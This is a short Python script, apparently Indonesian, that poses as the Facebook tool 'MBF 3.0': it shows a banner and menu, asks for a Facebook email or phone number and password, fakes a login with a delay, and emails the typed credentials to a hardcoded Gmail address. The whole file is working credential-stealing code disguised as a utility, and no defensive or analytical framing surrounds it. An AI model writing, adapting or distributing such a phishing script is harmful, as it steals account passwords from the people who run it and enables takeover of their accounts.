import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time

def kirim_email(penerima, subjek, body):
    sender_email = "akun2api@gmail.com"  # Ganti dengan email pengirim
    sender_password = "password_akun_email_anda"  # Ganti dengan password email pengirim

    # Membuat pesan email
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = penerima
    message["Subject"] = subjek
    message.attach(MIMEText(body, "plain"))

    # Mengirim email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()  # Mengamankan koneksi
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, penerima, message.as_string())
            print("[*] Email terkirim!")
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

def tampilkan_menu():
    print("""
           .-.-..                                  
          /+/++//                                  
         /+/++//                                   
  *   * /+/++//                                    
   \\ /  |/__//                                     
 {X}v{X}|MBF|==========.                           
   (')  /'|'\           \\                          
       /  \\  \\          '                          
       \\_  \\_ \\_   ___MBF 3.0___                   
                                                   
 * MULTI MAX                       
 * PIRMANSX                                        
 * https://github.com/pirmansx                     
 * https://facebook.com/groups/164201767529837     
 * https://pirmansx.waper.com                      
.======================.                           
|  AMBIL ID DARI.....  |                           
'======================'                           
#1 DAFTAR TEMAN                                    
#2 ANGGOTA GROUP                                   
#3 KELUAR...                                       
[?] PILIH:1                                        
[*] Login FB dulu bos...                           
    """)

def main():
    tampilkan_menu()
    email = input("[?] Email/HP: ")
    kata_sandi = input("[?] Kata Sandi: ")

    # Simulasi login
    print("[*] Sedang Login...")
    time.sleep(2)

    # Kirimkan informasi login ke email
    body = f"Login dengan Email/HP: {email}\nKata Sandi: {kata_sandi}"
    kirim_email("akun2api@gmail.com", "Login Info", body)

if __name__ == "__main__":
    main()
